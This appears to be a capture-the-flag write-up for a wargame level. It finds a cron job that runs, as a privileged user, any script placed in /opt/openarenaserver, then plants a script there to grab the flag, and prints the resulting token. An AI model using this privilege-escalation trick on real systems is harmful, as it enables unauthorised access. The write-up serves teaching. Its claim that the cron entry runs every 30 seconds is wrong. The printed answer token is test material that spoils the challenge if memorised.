# level05

```bash
find / -user flag05 2>/dev/null
# /usr/sbin/openarenaserver
```

### What is it?

```bash
ls -la /usr/sbin/openarenaserver
# -rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
```

`cat /usr/sbin/openarenaserver`
```sh
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

Understang the script:
```
ulimit just set the CPU limit, nothing interesting here
bash -x => Print commands and their arguments as they are executed.
==> Launches scripts located in `/opt/openarenaserver/` and then deletes it
```

### But how could we execute it as flag05 ?

When we login with ssh, there is this message: `You have new mail.` \
We don't have the `mail` command but with a quick research we know where to look (`/var/mail`)

```bash
cat /var/mail/level05
# */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Now we know that it runs automatically every 30sec, we can put this script in `/opt/openarenaserver/`
```bash
#!/usr/bin/env bash

echo `whoami` >> /tmp/whoami
echo `getflag` >> /tmp/getflag05
```

Once ran, we can display the flag:
```bash
cat /tmp/getflag05
# Check flag.Here is your token : viuaaale9huek52boumoomioc
```
